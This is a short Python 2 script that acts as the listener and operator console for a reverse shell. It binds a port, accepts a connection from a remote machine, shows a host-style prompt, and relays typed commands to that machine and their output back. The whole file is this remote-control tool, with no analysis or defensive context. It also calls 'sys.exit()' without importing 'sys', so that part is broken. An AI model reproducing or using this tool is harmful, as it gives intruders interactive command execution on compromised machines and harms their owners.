#!/usr/bin/env python
#-*- coding: utf-8 -*-

import socket, subprocess, os

def createSocket():
    try:
        global host
        global port
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = ''
        port = raw_input("Type the port for listening: ")
        if port == '':
            createSocket()
        port = int(port)
    except socket.error as err:
        print "Socket creation error: " + str(err[0])

def bindSocket():
    try:
        print "Binding socket at {}".format(port)
        s.bind((host, port))
        s.listen(1)
    except socket.error as err:
        print "Socket binding error: " + str(err[0])
        print "Retrying..."
        bindSocket()

def acceptSocket():
    global connection
    global adress
    global hostname
    try:
        connection, adress = s.accept()
        print "[!] Session opened at {} {}:".format(adress[0], adress[1])
        print "\n"
        hostname = connection.recv(1024)
        menu()
    except socket.error as err:
        print "Socket creation error: " + str(err[0])

def menu():
    while True:
        cmd = raw_input(str(adress[0])+"@"+str(hostname)+" >")
        if cmd == "quit":
            connection.close()
            s.close()
            sys.exit()
        command = connection.send(cmd)
        result = connection.recv(16834)
        if result <> hostname:
            print result

def main():
    createSocket()
    bindSocket()
    acceptSocket()

main()
